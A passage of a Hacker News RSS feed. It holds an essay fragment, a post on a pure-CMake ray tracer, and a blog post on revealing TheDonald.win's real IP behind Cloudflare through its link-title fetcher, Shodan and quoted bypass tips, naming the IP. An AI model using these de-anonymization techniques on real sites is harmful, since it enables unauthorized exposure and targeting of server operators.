It is often said that “there are two Americas,” a metaphor highlighting cultural and economic divides. But there aren’t just two Americas. There are thousands, if not millions, of Americas. Sorting the real from the simulated, the legitimate from the illegitimate, the American from the seditious, is, in theory, a job for a kind of technology. And yet, what strange, metastatic chaos future would such a technology create?
</p>
<p>
We now have a reality problem, created by a culture which has irrevocably fused with its technology. And just like any symbiosis, one cannot survive without the other.
</p>
      
  
        
      
       

       
        
     
        
    



</div></div>]]>
            </description>
            <link>https://www.chrbutler.com/we-have-a-reality-problem</link>
            <guid isPermaLink="false">hacker-news-small-sites-25700603</guid>
            <pubDate>Sat, 09 Jan 2021 14:24:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ray Tracing in pure CMake]]>
            </title>
            <description>
<![CDATA[
Score 272 | Comments 142 (<a href="https://news.ycombinator.com/item?id=25700038">thread link</a>) | @networked
<br/>
January 9, 2021 | https://64.github.io/cmake-raytracer/ | <a href="https://web.archive.org/web/*/https://64.github.io/cmake-raytracer/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    
    

    <div>
      <p>Without further ado, I present: a basic whitted ray tracer, complete with multicore rendering, written in 100% pure CMake. If you don't care about the details, and just want to see the code, you can <a href="https://github.com/64/cmake-raytracer">find it here</a>.</p>
<figure>
    <img src="https://github.com/64/cmake-raytracer/raw/master/render.png">
</figure>
<p>At this point, those familiar with CMake may have some questions, so keep reading to find out how it all works.</p>

<p><strong>Good news:</strong> CMake has a <a href="https://cmake.org/cmake/help/latest/command/math.html?highlight=math"><code>math</code></a> command. <strong>Bad news:</strong> it only supports integers. If you've written a ray tracer before, you probably did it with floating point numbers. So how do you go from representing signed integers to representing something-resembling-floating-point numbers? One answer is to use <a href="https://en.wikipedia.org/wiki/Fixed-point_arithmetic"><strong>fixed-point arithmetic</strong></a>.</p>
<p>The basic idea with fixed point is simple. We define some large integer to represent the number 1.0; let's choose <strong>1000</strong>. Then we can represent 2.0 as 2000, 0.5 as 500, -3.0 as -3000 etc. When we want to add two numbers, we simply add their fixed-point representations. Here's how that looks in CMake:</p>
<pre><span>function(add a b res)
    math(EXPR tmp </span><span>"(${</span><span>a</span><span>}) + (${</span><span>b</span><span>})"</span><span>)
    set(</span><span>"${</span><span>res</span><span>}" "${</span><span>tmp</span><span>}" </span><span>PARENT_SCOPE)
endfunction()
</span></pre>
<p>This takes two values <code>a</code> and <code>b</code> to be added and stored in the variable <code>res</code>. I use <code>PARENT_SCOPE</code> so that the variable we create is actually visible from the calling function, otherwise CMake will destroy it when the function ends.</p>
<p>To multiply two numbers, we simply multiply their fixed-point representations, and then divide by the thing we chose to represent 1.0:
<span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1.5</mn><mo>×</mo><mn>4.0</mn><mo>↦</mo><mfrac><mrow><mn>1500</mn><mo>×</mo><mn>4000</mn></mrow><mn>1000</mn></mfrac><mo>=</mo><mn>6000</mn><mo>↦</mo><mn>6.0</mn></mrow><annotation encoding="application/x-tex">1.5 \times 4.0 \mapsto \frac{1500 \times 4000}{1000} = 6000 \mapsto 6.0</annotation></semantics></math></span></span></span></p>
<p>Division is similar:
<span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1.5</mn><mo>÷</mo><mn>4.0</mn><mo>↦</mo><mfrac><mrow><mn>1500</mn><mo>×</mo><mn>1000</mn></mrow><mn>4000</mn></mfrac><mo>=</mo><mn>375</mn><mo>↦</mo><mn>0.375</mn></mrow><annotation encoding="application/x-tex">1.5 \div 4.0 \mapsto \frac{1500 \times 1000}{4000} = 375 \mapsto 0.375</annotation></semantics></math></span></span></span>
We could have multiplied by 1000 after doing the division, but as integer division rounds towards zero this would wipe out all our precision (as <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>1500</mn><mn>4000</mn></mfrac><mo>×</mo><mn>1000</mn><mo>=</mo><mn>0</mn><mo>×</mo><mn>1000</mn><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">\frac{1500}{4000}\times 1000 = 0 \times 1000 = 0</annotation></semantics></math></span></span>). Multiplying first gives us better results, as long as the dividend isn't too huge (which would cause overflow).</p>
<p>CMake's <code>math</code> command only supports basic integer arithmetic. For more complicated operations, like square root, we use <a href="https://en.wikipedia.org/wiki/Newton%27s_method">Newton-Raphson iteration</a>. You can read more about this <a href="https://en.wikipedia.org/wiki/Methods_of_computing_square_roots#Babylonian_method">here</a>, but the basic idea is to make a 'guess' as to what the output should be then iteratively refine the guess towards the answer. This gives a surprisingly accurate result within only three or four iterations, subject to the quality of the initial guess:</p>
<pre><span>function(sqrt x res)
    div_by_2(${x} guess)

    </span><span>foreach</span><span>(counter RANGE 4)
        </span><span>if</span><span>(${guess} EQUAL 0)
            set(</span><span>"${</span><span>res</span><span>}" </span><span>0 PARENT_SCOPE)
            return()
        </span><span>endif</span><span>()

        div(${x} ${guess} tmp)
        add(${tmp} ${guess} tmp)
        div_by_2(${tmp} guess)
    </span><span>endforeach</span><span>()

    set(</span><span>"${</span><span>res</span><span>}" "${</span><span>guess</span><span>}" </span><span>PARENT_SCOPE)
endfunction()

</span><span># sqrt(123) = 11.09072626, actual answer is 11.0905365064
</span></pre>
<p>I also implemented a similar function for computing <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>1</mn><msqrt><mi>x</mi></msqrt></mfrac></mrow><annotation encoding="application/x-tex">\frac{1}{\sqrt{x}}</annotation></semantics></math></span></span> separately as I found that it lead to better numerical stability, as opposed to computing the square root as above and then doing the reciprocal. This comes in handy when we need to normalize vectors.</p>
<p>Almost everything in computer graphics is done with vectors, so I started implementing vector operations: <code>vec3_add</code>, <code>vec3_mul</code>, <code>vec3_div</code>, <code>vec3_dot</code> etc. These make use of CMake built-in lists, which are pretty horrible, but save me from having to use three separate variables to keep track of the individual components of each vector. For example, here's what the dot product looks like:</p>
<pre><span>function(vec3_dot x y res)
    list(GET ${x} 0 x_0)
    list(GET ${x} 1 x_1)
    list(GET ${x} 2 x_2)
    list(GET ${y} 0 y_0)
    list(GET ${y} 1 y_1)
    list(GET ${y} 2 y_2)
    mul(${x_0} ${y_0} z_0)
    mul(${x_1} ${y_1} z_1)
    mul(${x_2} ${y_2} z_2)
    add(${z_0} ${z_1} tmp)
    add(${tmp} ${z_2} tmp)
    set(</span><span>"${</span><span>res</span><span>}" </span><span>${tmp} PARENT_SCOPE)
endfunction()
</span></pre>
<p>And here's how we'd use it to normalize a vector:</p>
<pre><span>function(vec3_normalize x res)
    vec3_dot(${x} ${x} x_2)
    rsqrt(${x_2} one_over_length)
    vec3_mulf(${x} ${one_over_length} tmp)
    set(</span><span>"${</span><span>res</span><span>}" </span><span>${tmp} PARENT_SCOPE)
endfunction()
</span></pre>
<p>As well a few other bits and bobs, like <code>clamp</code> and <code>truncate</code>, that's all the arithmetic that's needed.</p>

<p>If you're new to ray tracing, I'd refer you to <a href="https://twitter.com/peter_shirley">Peter Shirley's</a> wonderful book series '<a href="https://raytracing.github.io/">Ray Tracing in One Weekend</a>', which my code is loosely based on. The general intuition is to trace rays out from the camera into the scene and see what they intersect. Since we represent all our scene geometry and rays as mathematical objects, computing intersections between rays and geometry is just a case of solving equations. Once we have found an intersection, we compute the color of the point we intersected with, which may itself be computed by tracing rays towards light sources or towards other scene geometry.</p>
<figure>
    <img src="https://developer.nvidia.com/sites/default/files/pictures/2018/RayTracing/ray-tracing-image-1.jpg">
    <figcaption><i>The ray tracing algorithm.</i>  Credit: <a href="https://developer.nvidia.com/discover/ray-tracing">https://developer.nvidia.com</a></figcaption>
</figure> 
<p>To keep it simply I went with a simple scene consisting of a sphere sitting atop an infinite plane in a checkerboard color. I also ended up faking the shadow underneath the sphere, simply drawing a black circle (well done if you spotted it from the image). I had implemented whitted ray tracing and even path tracing at one point, but they were much more complicated and performed a lot worse for the same result. In theory, though, there's no reason why I couldn't do it properly, it would just require some additional effort and patience.</p>
<p>Here's what the main 'trace' function looks like, with some of the unnecessary bits stripped out for clarity:</p>
<pre><span># Traces a ray into the scene, computes the color returned along the ray
</span><span>function(trace ray_origin ray_dir depth color)
    </span><span># Base case for recursion
    </span><span>if</span><span>(${depth} GREATER_EQUAL 3)
        return()
    </span><span>else</span><span>()
        math(EXPR depth </span><span>"${</span><span>depth</span><span>} + 1"</span><span>)
    </span><span>endif</span><span>()

    </span><span># Calculate intersection points with the sphere and plane
    </span><span>sphere_intersect(${ray_origin} ${ray_dir} hit_t_1 hit_point_1 hit_normal_1)
    plane_intersect(${ray_origin} ${ray_dir} hit_t_2 hit_point_2 hit_normal_2)

    </span><span># Did we hit the sphere?
    </span><span>if</span><span>(${hit_t_1} GREATER ${ray_epsilon})
        </span><span># Calculate reflected ray direction
        </span><span>offset_origin(hit_point_1 hit_normal_1 new_origin)
        vec3_dot(hit_normal_1 ${ray_dir} scalar)
        mul_by_2(${scalar} scalar)
        vec3_mulf(hit_normal_1 ${scalar} refl_a)
        vec3_sub(${ray_dir} refl_a new_dir)

        </span><span># Recursively trace the new ray into the scene
        </span><span>trace(new_origin new_dir ${depth} traced_col)

        </span><span># Calculate contribution from lights
        </span><span>set(col 0 0 0)
        light_contrib(hit_point_1 hit_normal_1 light1_pos light1_col out_col1)
        light_contrib(hit_point_1 hit_normal_1 light2_pos light2_col out_col2)
        vec3_add(col out_col1 col)
        vec3_add(col out_col2 col)
        vec3_add(col traced_col col)

        set(base_col ${sphere_color})
        vec3_mul(base_col col col)

    </span><span># Did we hit the plane?
    </span><span>elseif</span><span>(${hit_t_2} GREATER ${ray_epsilon})
        </span><span># ...snip: Use equation of a circle to fake shadow, if we're within range
        # ...snip: Calculate checkerboard pattern
    </span><span>else</span><span>()
        </span><span># We hit nothing, return black
        </span><span>set(col 0 0 0)
    </span><span>endif</span><span>()

    set(</span><span>"${</span><span>color</span><span>}" </span><span>${col} PARENT_SCOPE)
endfunction()
</span></pre>
<p>When I started, I wouldn't sure if it would be possible to do in pure CMake, but with a little trickery we can manage it.</p>
<p>For <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span></span> processes, the basic plan is to divide up the image vertically and let each sub-process render a few rows. We can invoke sub-processes with the <a href="https://cmake.org/cmake/help/v3.0/command/execute_process.html"><code>execute_process</code></a> command, passing arguments (such as the worker index) via <code>-D</code>. Each process then spits their row data into a text file, which gets merged together by the master process once they've all finished.</p>
<p>One subtlety is that as we need all the sub-processes to run in parallel, we can't simply call <code>execute_process</code> <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span></span> times, as it would run them sequentially. Luckily, we can specify multiple processes to run simultaneously in one command (I think this is intended to be used for long chains where one program is piped into the next), but in order to avoid hardcoding <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span></span> we have to programmatically construct the call to <code>execute_process</code> with CMake's <a href="https://cmake.org/cmake/help/git-stage/command/cmake_language.html"><code>EVAL CODE</code></a> feature (thanks to <a href="https://github.com/martty/vuk">martty</a> for this idea):</p>
<pre><span>    message(STATUS </span><span>"Launching ray tracer with ${</span><span>num_procs</span><span>} processes, ${</span><span>image_width</span><span>}x${</span><span>image_height</span><span>} image..."</span><span>)

    set(exec_command </span><span>"execute_process(</span><span>\n</span><span>"</span><span>)
    </span><span>foreach</span><span>(worker_index RANGE 1 ${num_procs})
        set(exec_command </span><span>"${</span><span>exec_command</span><span>}COMMAND cmake . -Wno-dev -Dworker_index=${</span><span>worker_index</span><span>} -Dimage_width=${</span><span>image_width</span><span>} -Dimage_height=${</span><span>image_height</span><span>} -Dnum_procs=${</span><span>num_procs</span><span>}</span><span>\n</span><span>"</span><span>)
    </span><span>endforeach</span><span>()
    set(exec_command </span><span>"${</span><span>exec_command</span><span>} )"</span><span>)

    </span><span># Begin the worker processes
    </span><span>cmake_language(EVAL CODE ${exec_command})

    message(STATUS </span><span>"Finished ray tracing, gathering results..."</span><span>)
</span></pre>
<p>As per <a href="https://raytracing.github.io/">Ray Tracing in One Weekend</a>, I use the <a href="https://en.wikipedia.org/wiki/Netpbm#PPM_example">PPM image format</a>. This is a really simple text-based format which is perfect for my purposes as I don't have to bother with compression. Once we're done rendering we simply read all the data that the workers have spat out, write the PPM header, and print everything to <code>stderr</code>:</p>
<pre><span>    set(image_contents </span><span>"P3 ${</span><span>image_width</span><span>} ${</span><span>image_height</span><span>}</span><span>\n</span><span>255</span><span>\n\n</span><span>"</span><span>)

    </span><span>foreach</span><span>(worker_index RANGE 1 ${num_procs})
        file(READ </span><span>"worker-${</span><span>worker_index</span><span>}.txt" </span><span>file_contents)
        set(image_contents </span><span>"${</span><span>image_contents</span><span>}${</span><span>file_contents</span><span>}"</span><span>)
    </span><span>endforeach</span><span>()

    message(</span><span>"${</span><span>image_contents</span><span>}"</span><span>)
</span></pre>
<p>The division of work among the worker processes is pretty sub-optimal as the rows towards the top of the image are mostly empty whereas the rows at the bottom are entirely full, which means that some processes finish very fast while others take much longer. Fixing this problem is left as an exercise to the reader.</p>

<p>If you made it this far, thanks for reading! Feel free to create issues, send pull requests or star <a href="https://github.com/64/cmake-raytracer">the code on GitHub</a>.</p>

    </div>

    
    

    

    
        
            
              
        
    
</article></div>]]>
            </description>
            <link>https://64.github.io/cmake-raytracer/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25700038</guid>
            <pubDate>Sat, 09 Jan 2021 13:04:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Masks Off for TheDonald.win]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25700030">thread link</a>) | @some_furry
<br/>
January 9, 2021 | https://soatok.blog/2021/01/09/masks-off-for-thedonald-win/ | <a href="https://web.archive.org/web/*/https://soatok.blog/2021/01/09/masks-off-for-thedonald-win/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<div>

			
<p>In 2015, a subreddit called /r/The_Donald was created. This has made a lot of people very angry and widely been regarded as a bad move.</p>



<p>Roughly 5 years after its inception, the Reddit staff banned /r/The_Donald because it was a cesspool of hateful content and harmful conspiracy theories. You can learn more about it <a href="https://www.vikingsecblog.com/dumping-the-donald/">here</a>.</p>



<h2>Why are we talking about this in 2021?</h2>



<p>Well, <em>a lot has happened</em> in the first week of the new year. A lot of words have been written about the fascist insurrection that attempted a coup on the U.S. legislature, so I won’t belabor the point more than I have to.</p>



<p>But as it turns out: The shitty people who ran /r/The_Donald didn’t leave well enough alone when they got shit-canned.</p>



<div><figure><img loading="lazy" data-attachment-id="116" data-permalink="https://soatok.blog/soatok_stickerpack-facepaw/" data-orig-file="https://soatok.files.wordpress.com/2020/04/soatok_stickerpack-facepaw.png" data-orig-size="512,512" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Facepaw!" data-image-description="<p>Facepaw!</p>
" data-medium-file="https://soatok.files.wordpress.com/2020/04/soatok_stickerpack-facepaw.png?w=300" data-large-file="https://soatok.files.wordpress.com/2020/04/soatok_stickerpack-facepaw.png?w=512" src="https://soatok.files.wordpress.com/2020/04/soatok_stickerpack-facepaw.png?w=512" alt="Facepaw" width="512" height="512" srcset="https://soatok.files.wordpress.com/2020/04/soatok_stickerpack-facepaw.png 512w, https://soatok.files.wordpress.com/2020/04/soatok_stickerpack-facepaw.png?w=150 150w, https://soatok.files.wordpress.com/2020/04/soatok_stickerpack-facepaw.png?w=300 300w" sizes="(max-width: 512px) 100vw, 512px"><figcaption>Remember: You can’t recycle fash.<br>(Art by <a href="https://twitter.com/lynxvsjackalope">Khia</a>.)</figcaption></figure></div>



<p>Instead, they spun up a Reddit clone under the domain <code>thedonald.win</code> and hid it behind CloudFlare.</p>



<p>Even worse: Without Reddit rules to keep them in check, they’ve gone all in on political violence and terrorism.</p>



<p>(<strong>Content Warning</strong>: Fascism, political violence, and a myriad of other nastiness in the Twitter thread below.)</p>



<figure><div>

</div></figure>



<p>If you remember last year, I published a blog post about <a href="https://soatok.blog/2020/05/09/how-to-de-anonymize-scam-knock-off-sites-hiding-behind-cloudflare/">identifying the real server IP address from email headers</a>. This is far from a sophisticated technique, but if simple solutions work, why not use them?</p>



<p>(Related, I wrote a post in 2020 about <a href="https://soatok.blog/2020/11/12/deplatforming-hate-and-harassment/">more effectively deplatforming hate and harassment</a>. This knowledge will come in handy if you find yourself needing to stop the spread of political violence, but is strictly speaking not relevant to the techniques discussed on this page.)</p>



<h2 id="unmasking-thedonald.win">Unmasking TheDonald.win</h2>



<p>The technique I outlined in <a href="https://soatok.blog/2020/05/09/how-to-de-anonymize-scam-knock-off-sites-hiding-behind-cloudflare/">my previous post</a> doesn’t work on their Reddit clone software: Although it asks you for an (optional) email address at the time of account registration, it never actually emails you, and there is no account recovery feature (a.k.a. “I forgot my password”).</p>



<div><figure><img data-attachment-id="1388" data-permalink="https://soatok.blog/soatoktelegrams2020-12/" data-orig-file="https://soatok.files.wordpress.com/2020/09/soatoktelegrams2020-12.png" data-orig-size="512,512" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="SoatokTelegrams2020-12" data-image-description="" data-medium-file="https://soatok.files.wordpress.com/2020/09/soatoktelegrams2020-12.png?w=300" data-large-file="https://soatok.files.wordpress.com/2020/09/soatoktelegrams2020-12.png?w=512" src="https://soatok.files.wordpress.com/2020/09/soatoktelegrams2020-12.png?w=512" alt="" srcset="https://soatok.files.wordpress.com/2020/09/soatoktelegrams2020-12.png 512w, https://soatok.files.wordpress.com/2020/09/soatoktelegrams2020-12.png?w=150 150w, https://soatok.files.wordpress.com/2020/09/soatoktelegrams2020-12.png?w=300 300w" sizes="(max-width: 512px) 100vw, 512px"><figcaption>Foiled immediately! What’s a furry to do?<br>(Art by <a href="https://twitter.com/lynxvsjackalope">Khia</a>.)</figcaption></figure></div>



<p><strong>However, their software is still a Reddit clone!</strong></p>



<p>Reddit has this feature where you can submit links and it will helpfully fetch the page title for you. It looks like this:</p>



<div><figure><img data-attachment-id="2387" data-permalink="https://soatok.blog/2021/01/09/masks-off-for-thedonald-win/reddit-post/" data-orig-file="https://soatok.files.wordpress.com/2021/01/reddit-post.png" data-orig-size="566,655" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="reddit-post" data-image-description="" data-medium-file="https://soatok.files.wordpress.com/2021/01/reddit-post.png?w=259" data-large-file="https://soatok.files.wordpress.com/2021/01/reddit-post.png?w=566" src="https://soatok.files.wordpress.com/2021/01/reddit-post.png?w=566" alt="" srcset="https://soatok.files.wordpress.com/2021/01/reddit-post.png 566w, https://soatok.files.wordpress.com/2021/01/reddit-post.png?w=130 130w, https://soatok.files.wordpress.com/2021/01/reddit-post.png?w=259 259w" sizes="(max-width: 566px) 100vw, 566px"><figcaption>When I paste a URL into this form, it automatically fetches the title.</figcaption></figure></div>



<p>How this feature works is simple: They initiate an HTTP request server-side to fetch the web page, parse out the title tag, and return it.</p>



<p>So what happens if you control the server that their request is being routed to, and provide a unique URL?</p>



<div><figure><img data-attachment-id="2389" data-permalink="https://soatok.blog/thedonald-access-logs/" data-orig-file="https://soatok.files.wordpress.com/2021/01/thedonald-access-logs.png" data-orig-size="1044,239" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="thedonald-access-logs" data-image-description="" data-medium-file="https://soatok.files.wordpress.com/2021/01/thedonald-access-logs.png?w=300" data-large-file="https://soatok.files.wordpress.com/2021/01/thedonald-access-logs.png?w=580" src="https://soatok.files.wordpress.com/2021/01/thedonald-access-logs.png?w=1024" alt="" srcset="https://soatok.files.wordpress.com/2021/01/thedonald-access-logs.png?w=1024 1024w, https://soatok.files.wordpress.com/2021/01/thedonald-access-logs.png?w=150 150w, https://soatok.files.wordpress.com/2021/01/thedonald-access-logs.png?w=300 300w, https://soatok.files.wordpress.com/2021/01/thedonald-access-logs.png?w=768 768w, https://soatok.files.wordpress.com/2021/01/thedonald-access-logs.png 1044w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Leaking TheDonald.win’s true IP address from behind CloudFlare.</figcaption></figure></div>



<p>Well, that was easy! To eliminate false positives, I performed all of this sampling with Tor Browser and manually rebuilt the Tor Circuit multiple times, and always got the same IP address: <strong><code>167.114.145.140</code></strong>.</p>



<h4>An Even Lazier Technique</h4>



<p><strong><a href="https://www.shodan.io/search?query=thedonald.win">Just use Shodan</a>, lol</strong></p>



<figure><div>
<div><blockquote data-width="550" data-dnt="true"><p lang="en" dir="ltr">more redteam tricks: <a href="https://twitter.com/shodanhq?ref_src=twsrc%5Etfw">@shodanhq</a> results usually hold TLS cert information and HTTP-&gt;HTTPS redirect Location headers that can disclose information about a server hiding behind CF's network. most admins do not use the protections that exist at cloudflare to avoid that</p>— ʀǟʀɛƈօɨʟ (@_rarecoil) <a href="https://twitter.com/_rarecoil/status/1347768188017143808?ref_src=twsrc%5Etfw">January 9, 2021</a></blockquote></div>
</div></figure>



<p>Apparently chuds are really bad at OpSec, and their IP was exposed on Shodan this whole time.</p>



<div><figure><img data-attachment-id="121" data-permalink="https://soatok.blog/soatok_stickerpack-snicker/" data-orig-file="https://soatok.files.wordpress.com/2020/04/soatok_stickerpack-snicker.png" data-orig-size="512,512" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Hehe" data-image-description="" data-medium-file="https://soatok.files.wordpress.com/2020/04/soatok_stickerpack-snicker.png?w=300" data-large-file="https://soatok.files.wordpress.com/2020/04/soatok_stickerpack-snicker.png?w=512" src="https://soatok.files.wordpress.com/2020/04/soatok_stickerpack-snicker.png?w=512" alt="Soatok Laughing" srcset="https://soatok.files.wordpress.com/2020/04/soatok_stickerpack-snicker.png 512w, https://soatok.files.wordpress.com/2020/04/soatok_stickerpack-snicker.png?w=150 150w, https://soatok.files.wordpress.com/2020/04/soatok_stickerpack-snicker.png?w=300 300w" sizes="(max-width: 512px) 100vw, 512px"><figcaption>You can’t help but laugh at their incompetence.<br>(Art by <a href="https://twitter.com/lynxvsjackalope">Khia</a>.)</figcaption></figure></div>



<h3>The Road to Accountability</h3>



<p>Okay, so we have their real IP address. What can we do with it?</p>



<p>The easiest thing to do is find out who’s hosting their servers, with a simple WHOIS lookup on their IP address.</p>



<div><figure><img data-attachment-id="2403" data-permalink="https://soatok.blog/2021/01/09/masks-off-for-thedonald-win/thedonald-whois/" data-orig-file="https://soatok.files.wordpress.com/2021/01/thedonald-whois.png" data-orig-size="468,229" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="thedonald-whois" data-image-description="" data-medium-file="https://soatok.files.wordpress.com/2021/01/thedonald-whois.png?w=300" data-large-file="https://soatok.files.wordpress.com/2021/01/thedonald-whois.png?w=468" src="https://soatok.files.wordpress.com/2021/01/thedonald-whois.png?w=468" alt="" srcset="https://soatok.files.wordpress.com/2021/01/thedonald-whois.png 468w, https://soatok.files.wordpress.com/2021/01/thedonald-whois.png?w=150 150w, https://soatok.files.wordpress.com/2021/01/thedonald-whois.png?w=300 300w" sizes="(max-width: 468px) 100vw, 468px"></figure></div>



<p>Hosted by OVH Canada, eh? After all, nothing screams “Proud American” like hosting your website with a French company in a Canadian datacenter.</p>



<div><figure><img data-attachment-id="1389" data-permalink="https://soatok.blog/soatoktelegrams2020-13/" data-orig-file="https://soatok.files.wordpress.com/2020/09/soatoktelegrams2020-13.png" data-orig-size="512,512" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="SoatokTelegrams2020-13" data-image-description="" data-medium-file="https://soatok.files.wordpress.com/2020/09/soatoktelegrams2020-13.png?w=300" data-large-file="https://soatok.files.wordpress.com/2020/09/soatoktelegrams2020-13.png?w=512" src="https://soatok.files.wordpress.com/2020/09/soatoktelegrams2020-13.png?w=512" alt="" srcset="https://soatok.files.wordpress.com/2020/09/soatoktelegrams2020-13.png 512w, https://soatok.files.wordpress.com/2020/09/soatoktelegrams2020-13.png?w=150 150w, https://soatok.files.wordpress.com/2020/09/soatoktelegrams2020-13.png?w=300 300w" sizes="(max-width: 512px) 100vw, 512px"><figcaption>Dunking on these fools for the inconsistencies in their worldview is self-care and I recommend it, even though I know they don’t care one iota about hypocrisy.</figcaption></figure></div>



<p>I immediately wondered if their ISP was aware they were hosting right-wing terrorists, so I filed an innocent <a href="https://www.ovh.com/world/abuse/">abuse report</a> with details about how I obtained their IP address and the kind of behavior they’re engaging in. Canada’s laws about hate speech and inciting violence are <a href="https://www.cbc.ca/news/canada/toronto/your-ward-news-james-sears-sentenced-1.5256452">comparably strict</a>, after all.</p>



<p>I’ll update this post later if OVH decides to take action.</p>



<h2>Lessons to Learn</h2>



<p>First, don’t tolerate violent political extremists, or you’ll end up with political violence on your hands. <strong><a href="https://www.vice.com/en/article/bjbp9d/do-social-media-bans-work">Deplatforming works</a>.</strong></p>



<figure><div>
<div><blockquote data-width="550" data-dnt="true"><div lang="en" dir="ltr"><p>Bringing back this gem:</p><p>If you're a Nazi, and you're fired, it's your fault. 👏👏<br>If you're a Nazi, and you're fired, it's your fault. 👏👏<br>If you were spotted in the mob, and you lost your fucking job. <br>You're a Nazi, you've been fired, it's your fault. 👏👏</p></div>— 🐰Witchie 🧶💜 (@witchiebunny) <a href="https://twitter.com/witchiebunny/status/1347624481318166528?ref_src=twsrc%5Etfw">January 8, 2021</a></blockquote></div>
</div><figcaption>It’s catchy!</figcaption></figure>



<p>Second, and most important: Online privacy is hard. Hard enough that bigots, terrorists, and seditious insurrectionists can’t do it right.</p>



<p>This bears emphasizing: None of the techniques I’ve shared on the history of my blog are particularly clever or novel. But they work extremely well, and they’re useful for exposing shitty people.</p>



<p>Remember: Sunlight is the best disinfectant.</p>



<p>Conversely: Basic OSINT isn’t hard; merely tedious.</p>



<h3>Other Techniques (from Twitter)</h3>



<p>Subdomain leaks (via @z3dster):</p>



<figure><div>

</div></figure>



<p>Exploiting CloudFlare workers (via @4dwins):</p>



<figure><div>
<div><blockquote data-width="550" data-dnt="true"><p lang="en" dir="ltr">When they limit the origin to the CDN range you can sometimes get around it using a proxy in a Cloudflare worker. For Akamai you can spin up a distribution on Azure for cheap they resell.</p>— Jack Nutt (@4dwins) <a href="https://twitter.com/4dwins/status/1347809701291937792?ref_src=twsrc%5Etfw">January 9, 2021</a></blockquote></div>
</div></figure>



